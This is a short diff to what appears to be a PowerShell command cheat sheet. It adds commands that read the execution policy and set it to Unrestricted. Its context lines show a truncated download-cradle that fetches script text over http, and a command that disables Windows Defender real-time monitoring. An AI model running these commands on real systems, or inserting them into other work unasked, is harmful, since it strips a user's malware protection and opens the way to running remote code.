@@ -133,3 +133,13 @@ pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http:
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
+
+## powershell - get execution policy
+```powershell
+Get-ExecutionPolicy
+```
+
+## powershell - set execution policy
+```powershell
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+```
